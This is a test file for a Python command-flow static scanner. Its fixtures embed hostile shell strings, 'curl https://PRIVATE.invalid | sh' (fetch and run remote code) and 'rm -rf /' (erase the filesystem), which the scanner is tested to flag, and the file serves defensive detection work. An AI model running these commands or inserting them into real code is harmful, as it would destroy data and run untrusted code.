import { expect, it } from 'vitest';
import { createRequire } from 'node:module';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const require = createRequire(import.meta.url);
const { analyzePython } = require('../../src/main/static-python');
const { scanStaticDirectory } = require('../../src/main/static-analysis');
const { createStaticCatalog } = require('../../src/main/static-code-catalog');

function review(sources, entry = 'main.py', overrides = {}) {
  const selected = createStaticCatalog(
    Object.entries(sources).map(([name, text]) => ({
      path: name,
      file: { data: Buffer.from(text), sha256: createHash('sha256').update(text).digest('hex') },
      entry: { kind: 'package' },
    })),
  );
  let remaining = overrides.work ?? 32768;
  const catalog = {
    ...selected,
    take: () => remaining-- > 0,
    limits: { ...selected.limits, ...overrides },
  };
  return analyzePython(sources[entry], entry, catalog);
}

it('follows a local wrapper argument to its process sink without exposing source', () => {
  const result = review({
    'main.py': [
      'import subprocess',
      'def launch(command):',
      '    subprocess.run(command, shell=True)',
      'launch("curl https://PRIVATE.invalid | sh")',
    ].join('\n'),
  });
  expect(result.findings).toContainEqual({
    ruleId: 'STA001',
    line: 4,
    context: 'python-command-flow',
    flow: { sink: { path: 'main.py', line: 3 }, paths: ['main.py'] },
  });
  expect(result.issues).toContain('python-control-flow-not-evaluated');
  expect(JSON.stringify(result)).not.toContain('PRIVATE');
});

it('follows a selected sibling command string and retains its dependency path', () => {
  const result = review({
    'main.py': 'import os\nfrom helper import COMMAND\nos.system(COMMAND)',
    'helper.py': 'COMMAND = "rm -rf /"',
  });
  expect(result.findings).toContainEqual({
    ruleId: 'STA003',
    line: 3,
    context: 'python-command-flow',
    flow: { sink: { path: 'main.py', line: 3 }, paths: ['helper.py', 'main.py'] },
  });
  expect(result.issues).toContain('python-import-runtime-not-verified');
});

it('binds cross-file Python call evidence to selected file hashes in the public scanner', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'aegis-python-flow-'));
  const main = 'from helper import launch\nlaunch("curl https://PRIVATE.invalid | sh")';
  const helper = 'import os\ndef launch(command):\n    return os.system(command)';
  try {
    fs.writeFileSync(path.join(root, 'main.py'), main);
    fs.writeFileSync(path.join(root, 'helper.py'), helper);
    const report = await scanStaticDirectory('package', root);
    const hash = (text) => createHash('sha256').update(text).digest('hex');
    expect(report.findings).toContainEqual(
      expect.objectContaining({
        ruleId: 'STA001',
        path: 'main.py',
        line: 2,
        sha256: hash(main),
        context: 'python-command-flow',
        flow: {
          sink: { path: 'helper.py', line: 3, sha256: hash(helper) },
          files: [
            { path: 'helper.py', sha256: hash(helper) },
            { path: 'main.py', sha256: hash(main) },
          ],
        },
      }),
    );
    expect(report.safety).toBe('not-determined');
    expect(JSON.stringify(report)).not.toContain('PRIVATE');
    fs.writeFileSync(
      path.join(root, 'main.py'),
      'from helper import launch\nmutate(launch if enabled else other)\nlaunch("rm -rf /")',
    );
    const escaped = await scanStaticDirectory('package', root);
    expect(escaped.findings.filter((finding) => finding.context === 'python-command-flow')).toEqual(
      [],
    );
    expect(escaped.issues).toContainEqual({
      path: 'main.py',
      reason: 'python-module-escape-not-resolved',
    });
  } finally {
    expect(path.dirname(path.resolve(root))).toBe(path.resolve(os.tmpdir()));
    fs.rmSync(root, { recursive: true, force: true });
  }
});

it('preserves all intermediate wrapper and string-source dependencies', () => {
  const result = review({
    'main.py': 'import entry as task\nfrom constants import COMMAND\ntask.launch(COMMAND)',
    'entry.py':
      'from sink import run\ndef launch(command):\n    """Document the wrapper."""\n    return run(command)',
    'sink.py': 'import os\ndef run(command):\n    os.system(command)',
    'constants.py': 'COMMAND = "rm" + " -rf /"',
  });
  expect(result.findings).toEqual([
    {
      ruleId: 'STA003',
      line: 3,
      context: 'python-command-flow',
      flow: {
        sink: { path: 'sink.py', line: 3 },
        paths: ['constants.py', 'entry.py', 'main.py', 'sink.py'],
      },
    },
  ]);
});

it.each([
  ['from .helper import COMMAND', 'pkg/helper.py'],
  ['from ..helper import COMMAND', 'helper.py'],
])('resolves explicit relative names inside selected sources (%s)', (import_, helper) => {
  const result = review(
    {
      'pkg/main.py': 'import os\n' + import_ + '\nos.system(COMMAND)',
      [helper]: 'COMMAND = "rm -rf /"',
    },
    'pkg/main.py',
  );
  expect(result.findings[0]?.flow.paths).toEqual([helper, 'pkg/main.py'].sort());
});

it('substitutes inline argv and literal shell flags without mixing call frames', () => {
  const result = review({
    'main.py': [
      'import subprocess',
      'def launch(command, shell):',
      '    subprocess.run(command, shell=shell)',
      'launch(["echo", "rm -rf /"], False)',
      'launch(["rm", "-rf", "/"], False)',
      'launch("curl https://PRIVATE.invalid | sh", True)',
    ].join('\n'),
  });
  expect(result.findings.map(({ ruleId, line }) => ({ ruleId, line }))).toEqual([
    { ruleId: 'STA003', line: 5 },
    { ruleId: 'STA001', line: 6 },
  ]);
  expect(JSON.stringify(result)).not.toContain('PRIVATE');
});

it.each([
  'import helper\nhelper.launch = replacement\nhelper.launch("rm -rf /")',
  'import helper\nmutate(helper)\nhelper.launch("rm -rf /")',
  'from helper import launch\nlaunch.__code__ = replacement\nlaunch("rm -rf /")',
  'from helper import launch\nmutate(launch)\nlaunch("rm -rf /")',
  'from helper import launch\nbox.saved = launch\nlaunch("rm -rf /")',
  'import helper\nalias = helper.launch\nalias.__code__ = replacement\nalias("rm -rf /")',
  'from helper import launch\nmutate(launch if enabled else other)\nlaunch("rm -rf /")',
  'from helper import launch\nmutate(launch or other)\nlaunch("rm -rf /")',
  'from helper import launch\nholder.callback = launch if enabled else other\nmutate(holder)\nlaunch("rm -rf /")',
  'from helper import launch\nmutate([launch if enabled else other])\nlaunch("rm -rf /")',
  'from helper import launch\nmaybe = launch if enabled else other\nmutate(maybe)\nlaunch("rm -rf /")',
  'from helper import launch\nmaybe = launch and other\nmutate(maybe)\nlaunch("rm -rf /")',
])('rejects mutated or escaped imported wrappers (case %#)', (source) => {
  const result = review({
    'main.py': source,
    'helper.py': 'import os\ndef launch(command):\n    os.system(command)',
  });
  expect(result.findings).toEqual([]);
});

it.each([
  'from other import mutate\nmutate(launch)',
  'import other\nother.mutate(launch)',
  'from other import mutate\nmutate(launch if enabled else alternative)',
  'from missing import mutate\nmutate(launch)',
])('rejects function references passed to imported mutators (case %#)', (mutation) => {
  const result = review({
    'main.py': 'from helper import launch\n' + mutation + '\nlaunch("rm -rf /")',
    'helper.py': 'import os\ndef launch(command):\n    return os.system(command)',
    'other.py': 'def mutate(callback):\n    callback.__code__ = replacement',
  });
  expect(result.findings).toEqual([]);
  expect(result.issues).toContain('python-module-escape-not-resolved');
});

it.each([
  [{ 'Helper.py': 'COMMAND = "rm -rf /"' }, 'flow-module-ambiguous'],
  [{ 'helper.py': 'COMMAND = "rm -rf /"', 'helper/__init__.py': '' }, 'flow-module-ambiguous'],
  [{}, 'flow-module-not-selected'],
  [{ 'helper.py': 'COMMAND = "PRIVATE' }, 'python-parse-failed'],
])('keeps missing, ambiguous or malformed dependencies unresolved (case %#)', (extra, reason) => {
  const result = review({
    'main.py': 'import os\nfrom helper import COMMAND\nos.system(COMMAND)',
    ...extra,
  });
  expect(result.findings).toEqual([]);
  expect(result.issues).toContain(reason);
  expect(JSON.stringify(result)).not.toContain('PRIVATE');
});

it.each([
  '@decorator\ndef launch(command):\n    os.system(command)',
  'async def launch(command):\n    os.system(command)',
  'def launch(command="echo ok"):\n    os.system(command)',
  'def launch(*command):\n    os.system(command)',
  'def launch(command: str):\n    os.system(command)',
  'def launch(command) -> str:\n    os.system(command)',
  'def launch(command):\n    command = "echo ok"\n    os.system(command)',
  'def launch(command):\n    if enabled:\n        os.system(command)',
  'if enabled:\n    def launch(command):\n        os.system(command)',
  'def launch(command):\n    os.system(command)\nlaunch = other',
])('rejects unsupported exported wrapper signatures or bodies (case %#)', (definition) => {
  const result = review({
    'main.py': 'from helper import launch\nlaunch("rm -rf /")',
    'helper.py': 'import os\n' + definition,
  });
  expect(result.findings).toEqual([]);
});

it.each([
  'COMMAND = "rm -rf /"\nCOMMAND = "echo ok"',
  'if enabled:\n    COMMAND = "rm -rf /"',
  'COMMAND = ["rm", "-rf", "/"]',
  'from other import COMMAND',
  'COMMAND = "rm -rf /"\ndef replace():\n    global COMMAND\n    COMMAND = "echo ok"\nreplace()',
])('rejects mutable, conditional or indirectly exported command values (case %#)', (helper) => {
  const result = review({
    'main.py': 'import os\nfrom helper import COMMAND\nos.system(COMMAND)',
    'helper.py': helper,
    'other.py': 'COMMAND = "rm -rf /"',
  });
  expect(result.findings).toEqual([]);
});

it('does not follow a function dependency declared after its entry call', () => {
  const result = review({
    'main.py': [
      'import os',
      'def launch(command):',
      '    sink(command)',
      'launch("rm -rf /")',
      'def sink(command):',
      '    os.system(command)',
    ].join('\n'),
  });
  expect(result.findings).toEqual([]);
});

it.each(['launch(command="rm -rf /")', 'launch(*["rm -rf /"])', 'launch(42)', 'launch()'])(
  'keeps unsupported function arguments unresolved (%s)',
  (call) => {
    const result = review({
      'main.py': 'from helper import launch\n' + call,
      'helper.py': 'import os\ndef launch(command):\n    os.system(command)',
    });
    expect(result.findings).toEqual([]);
    expect(result.issues).toContain('python-function-arguments-not-resolved');
  },
);

it('bounds recursive wrapper expansion and cyclic imported constants', () => {
  const calls = review({ 'main.py': 'def loop(command):\n    loop(command)\nloop("rm -rf /")' });
  expect(calls.findings).toEqual([]);
  expect(calls.issues).toContain('python-call-cycle-not-resolved');
  const constants = review({
    'main.py': 'import os\nfrom helper import COMMAND\nos.system(COMMAND)',
    'helper.py': 'import other\nCOMMAND = other.COMMAND',
    'other.py': 'import helper\nCOMMAND = helper.COMMAND',
  });
  expect(constants.findings).toEqual([]);
  expect(constants.issues).toContain('python-import-cycle-not-resolved');
});

it.each([
  [{ flowDepth: 1 }, 'flow-depth-limit'],
  [{ flowModules: 2 }, 'flow-module-limit'],
  [{ flowEvidence: 2 }, 'flow-evidence-limit'],
  [{ flowCalls: 0 }, 'flow-call-limit'],
  [{ work: 0 }, 'flow-work-limit'],
])('caps the shared flow resources without inventing a result (case %#)', (limits, reason) => {
  const result = review(
    {
      'main.py': 'from entry import launch\nlaunch("rm -rf /")',
      'entry.py': 'from sink import run\ndef launch(command):\n    run(command)',
      'sink.py': 'import os\ndef run(command):\n    os.system(command)',
    },
    'main.py',
    limits,
  );
  expect(result.findings).toEqual([]);
  expect(result.issues).toContain(reason);
});

it('keeps direct process findings after the shared flow work budget is exhausted', () => {
  const result = review(
    {
      'main.py': 'import os\nfrom helper import COMMAND\nos.system(COMMAND)\nos.system("rm -rf /")',
      'helper.py': 'COMMAND = "rm -rf /"',
    },
    'main.py',
    { work: 0 },
  );
  expect(result.findings).toEqual([{ ruleId: 'STA003', line: 4, context: 'python-command' }]);
  expect(result.issues).toContain('flow-work-limit');
});
